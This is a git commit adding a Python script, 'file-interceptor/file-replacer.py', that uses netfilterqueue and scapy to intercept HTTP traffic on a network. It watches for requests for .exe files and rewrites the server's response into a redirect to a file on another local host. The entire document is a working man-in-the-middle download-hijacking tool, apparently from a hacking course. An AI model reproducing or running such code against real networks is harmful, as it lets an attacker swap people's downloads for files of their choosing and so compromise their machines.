997c5d90095299959ff7da58f239f7c117596d74
Shawn D'Souza <shawn@monetago.com>
2019-11-03 10:59:31 +0530

    Created a file-interceptor

---
+++ file-interceptor/file-replacer.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].len
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet    = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            # print("HTTP Request")
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+]. exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+           # print("HTTP Response")
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+]. Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.0.232/guitar-pics.jpg\n\n")
+
+                packet.set_payload(str(modified_packet))
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
